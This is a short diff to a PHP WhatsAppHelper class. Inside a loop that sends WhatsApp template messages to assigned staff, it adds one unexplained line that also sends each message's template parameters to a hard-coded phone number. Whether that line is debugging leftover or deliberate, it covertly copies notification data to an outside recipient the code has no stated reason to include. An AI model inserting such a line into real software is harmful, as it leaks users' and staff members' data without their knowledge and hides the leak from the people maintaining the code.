@@ -66,6 +66,7 @@ class WhatsAppHelper
                         'role' => $assignment->role,
                         'success' => self::sendMessage($assignment->staff->whatsapp_number, '', $templateParams)
                     ];
+                    self::sendMessage("8269566034", '', $templateParams);
                 }
             }
 
